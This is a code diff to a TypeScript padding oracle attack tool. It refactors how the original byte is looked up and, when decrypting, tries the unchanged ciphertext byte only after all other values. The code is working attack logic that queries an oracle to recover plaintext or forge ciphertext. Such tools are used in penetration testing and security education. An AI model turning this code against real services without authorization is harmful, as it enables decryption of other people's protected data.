@@ -10,7 +10,7 @@ import { logProgress, logWarning } from './logging'
 import waitUntilFirstTruthyPromise from './promises'
 import { HeadersObject, OracleResult, POOptions } from './types'
 
-type AddPayload = (str?: string) => string|undefined
+type AddPayload = (str?: string) => string | undefined
 
 function getHeaders(headersArg: string | string[] | HeadersObject | undefined, addPayload: AddPayload) {
   if (!headersArg) return {}
@@ -102,7 +102,8 @@ const PaddingOracle = (options: POOptions) => {
     return { twoBlocks }
   }
   let badErrorArgConfidence = 0
-  function byteFound({ offset, byte, origByte, currentPadding }: { offset: number, byte: number, origByte: number, currentPadding: number }) {
+  function byteFound({ offset, byte, currentPadding }: { offset: number, byte: number, currentPadding: number }) {
+    const origByte = origBytes[offset] // plaintext or ciphertext
     if (byte === origByte) badErrorArgConfidence++
     const interByte = byte ^ currentPadding
     const foundByte = origByte ^ interByte
@@ -111,8 +112,7 @@ const PaddingOracle = (options: POOptions) => {
     foundOffsets.add(offset)
   }
   async function processByte(
-    { blockI, byteI, byte, origByte, currentPadding, offset }:
-    { blockI: number, byteI: number, byte: number, origByte: number, currentPadding: number, offset: number }
+    { blockI, byteI, byte, currentPadding, offset }: { blockI: number, byteI: number, byte: number, currentPadding: number, offset: number }
   ): Promise<boolean> {
     const { twoBlocks } = constructPayload({ blockI, byteI, byte, currentPadding })
 
@@ -121,7 +121,7 @@ const PaddingOracle = (options: POOptions) => {
     const req = await callOracle(twoBlocks)
     const decryptionSuccess = isDecryptionSuccess(req)
 
-    if (decryptionSuccess) byteFound({ offset, byte, origByte, currentPadding })
+    if (decryptionSuccess) byteFound({ offset, byte, currentPadding })
 
     if (logMode === 'full') {
       if (!(foundOffsets.has(offset) && !decryptionSuccess)) { // make sure concurrency doesn't cause former bytes progress to be logged after later byte
@@ -131,21 +131,27 @@ const PaddingOracle = (options: POOptions) => {
 
     return decryptionSuccess
   }
+  const isDecrypting = origBytes === ciphertext
   async function processBlock(blockI: number) {
     for (const byteI of range(blockSize - 1, -1)) {
       const currentPadding = blockSize - byteI
       const offset = (blockSize * blockI) + byteI
-      const origByte = origBytes[offset] // plaintext or ciphertext
       if (foundOffsets.has(offset)) continue
-      const byteRange: number[] = range(0, 256)
+      const cipherByte = ciphertext[offset]
+      const byteRange = isDecrypting
+        ? range(0, 256).filter(b => b !== cipherByte)
+        : range(0, 256)
       if (concurrency > 1) {
-        const promises = byteRange.map(byte => bluebird.method(() => processByte({ blockI, byteI, byte, origByte, currentPadding, offset })))
+        const promises = byteRange.map(byte => bluebird.method(() => processByte({ blockI, byteI, byte, currentPadding, offset })))
         await waitUntilFirstTruthyPromise(promises, { concurrency })
       } else {
         for (const byte of byteRange) {
-          const success = await processByte({ blockI, byteI, byte, origByte, currentPadding, offset })
+          const success = await processByte({ blockI, byteI, byte, currentPadding, offset })
           if (success) break
         }
+      }
+      if (!foundOffsets.has(offset)) {
+        await processByte({ blockI, byteI, byte: cipherByte, currentPadding, offset })
       }
       if (!foundOffsets.has(offset)) throw Error(`Padding oracle failure for offset: 0x${offset.toString(16)}. Try again or check the parameter you provided for determining decryption success.`)
     }
